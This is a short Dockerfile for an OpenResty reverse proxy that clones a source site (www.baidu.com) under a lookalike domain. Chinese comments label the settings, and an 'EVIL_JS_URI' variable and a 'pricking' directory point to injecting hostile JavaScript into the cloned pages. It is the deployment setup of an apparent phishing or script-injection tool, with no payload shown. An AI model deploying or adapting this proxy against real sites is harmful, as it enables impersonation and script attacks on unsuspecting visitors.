FROM openresty/openresty:alpine
ENV PROXY_PASS_HOST www.baidu-proxy.com # 自己的域名
ENV PROXY_SOURCE_HOST www.baidu.com # 要克隆的域名
ENV NGINX_LISTEN_PORT 80 # 监听端口，不建议改动
ENV EVIL_JS_URI b026324c6904b2a9cb4b88d6d61c81d1 # JS虚拟目录名称
WORKDIR /tmp/
COPY ./docker/nginx.conf /usr/local/openresty/nginx/conf/nginx.conf
COPY ./docker/docker-entrypoint.sh /tmp/docker-entrypoint.sh
RUN mkdir -p /tmp/pricking/static/ && chmod +x /tmp/docker-entrypoint.sh 
ENTRYPOINT ["/tmp/docker-entrypoint.sh"]